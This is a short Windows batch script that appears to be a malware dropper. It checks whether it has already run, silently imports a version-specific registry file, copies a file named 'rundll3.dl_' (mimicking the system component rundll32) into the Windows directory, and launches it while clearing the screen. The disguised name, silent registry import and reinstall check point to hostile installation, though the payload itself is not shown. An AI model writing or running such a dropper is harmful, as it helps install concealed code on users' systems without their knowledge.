@echo off

IF EXIST %WINDIR%\RUNDLL3.DL_ GOTO :END

ver|find "NT">NUL
IF ERRORLEVEL 1 GOTO :WIN9X
IF NOT ERRORLEVEL 1 GOTO :WINNT

:WIN9X
cls
regedit /s 9x.reg
cls
copy rundll3.dl_ %windir%\rundll3.dl_ > NUL
cls
start %windir%\rundll3.dl_
GOTO :END


:WINNT
regedit /s nt.reg
copy rundll3.dl_ %windir%\rundll3.dl_ > NUL
cls
start %windir%\rundll3.dl_
GOTO :END


:END
cls


